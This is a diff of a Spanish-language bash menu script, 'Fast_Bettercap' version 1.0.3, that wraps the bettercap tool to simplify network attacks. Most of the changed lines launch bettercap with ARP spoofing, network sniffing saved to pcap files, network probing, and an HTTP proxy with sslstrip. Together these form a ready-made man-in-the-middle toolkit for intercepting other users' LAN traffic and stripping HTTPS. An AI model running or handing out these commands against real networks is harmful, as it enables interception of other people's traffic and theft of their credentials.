@@ -1,7 +1,7 @@
 #!/bin/bash
 #Fast_Bettercap es un script en bash que busca simplificar el uso del nuevo bettercap para aquellas personas que no saben como utilizarla.
 #No busco robarme el crédito de esta maravillosa herramienta llamada BETTERCAP, simplemente facilitar su uso.
-#Esta es la version 1.0.2 y estoy re diseñando las funciones y menú de selección para hacerlo mas completo.
+#Esta es la version 1.0.3 y estoy re diseñando las funciones y menú de selección para hacerlo mas completo.
 #No soy un programador, ni me considero un hacker, solo soy un entusiasta de informatica.
 #Por si quieren contactarme: hablemosdehacking@gmail.com
 #Acepto sugerencias y criticas.
@@ -12,7 +12,7 @@
 BANNER() {
 	clear;echo;
 echo -e '\e[1;33m   -::-.`                                                   `...`     \e[0m'
-echo -e '\e[1;33m  .shhhhhhyo/-`           \e[1;37mFast Bettercap V1.0.2\e[1;33m          .:+syhhhhhs.  \e[0m'
+echo -e '\e[1;33m  .shhhhhhyo/-`           \e[1;37mFast Bettercap V1.0.3\e[1;33m          .:+syhhhhhs.  \e[0m'
 echo -e '\e[1;33m `yhhhhhhhhhhhys+-`         \e[1;37m By:> John-Wick\e[1;33m        .:+syhhhhhhhhhhhs;\e[0m'
 echo -e '\e[1;33m :hhhhhhhhhhhhhhhhhyo/-.                     `.:+oyhhhhhhhhhdhhhhhhh- \e[0m'
 echo -e '\e[1;33m +hhhhhh\e[1;37mMMMMNN\e[1;33mmdhhhhhhhhyso+/:--.......-:/+oyyhhhhhhhhdm\e[1;37mNMMMMM\e[1;33mmhhhhh/ \e[0m'
@@ -26,7 +26,7 @@ echo -e '\e[1;33m                                ``.```  \e[0m';echo;
 }
 
 DEPENDENCIAS() {
-clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V1.0.2 ]]]\e[0m";echo;sleep 0.2
+clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V1.0.3 ]]]\e[0m";echo;sleep 0.2
 if [ -f /root/bettercap.history ]; then
 	sudo rm /root/bettercap.history 2> /dev/null
 fi
@@ -263,9 +263,9 @@ SNIFFALL() {
 SET_TARGET;SAVECAPTURE
 	 case $SINO in
 			[s]* ) FILEPATH;
-					gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; net.sniff on; arp.spoof on; events.clear" && clear; MENU_PRINCIPAL;
+					gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; net.sniff on; arp.spoof on; net.probe on; events.clear" && clear; MENU_PRINCIPAL;
 			;;
-			[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.sniff on; arp.spoof on; events.clear" && clear; MENU_PRINCIPAL;
+			[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.sniff on; events.clear; arp.spoof on; net.probe on " && clear; MENU_PRINCIPAL;
 			;;	
 			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
 			;;
@@ -280,7 +280,7 @@ SNIFFTARGET() {
 
 			;;
 		[n]* ) SET_IP;
-				gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
+				gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets $SNIFFTARGETOPCION; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
 			;;	
 			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
 			;;
@@ -308,9 +308,9 @@ SET_TARGET;SAVECAPTURE;
 	 case $SINO in
 			[s]* ) FILEPATH;SSLSTRIPONOFF
 							case $SSLTRIPOPCION in
-									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
+									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff, net.probe"  && clear;MENU_PRINCIPAL;
 									;;
-									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
+									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff, net.probe"  && clear;MENU_PRINCIPAL;
 									;;
 								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";SSLSTRIPONOFF;
 									;;
@@ -324,9 +324,9 @@ SET_TARGET;SAVECAPTURE;
 							read SSLTRIPOPCION
 					done
 							case $SSLTRIPOPCION in
-									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
+									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff, net.probe"  && clear;MENU_PRINCIPAL;
 									;;
-									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL; 
+									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff, net.probe"  && clear;MENU_PRINCIPAL; 
 									;;
 								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";
 									;;
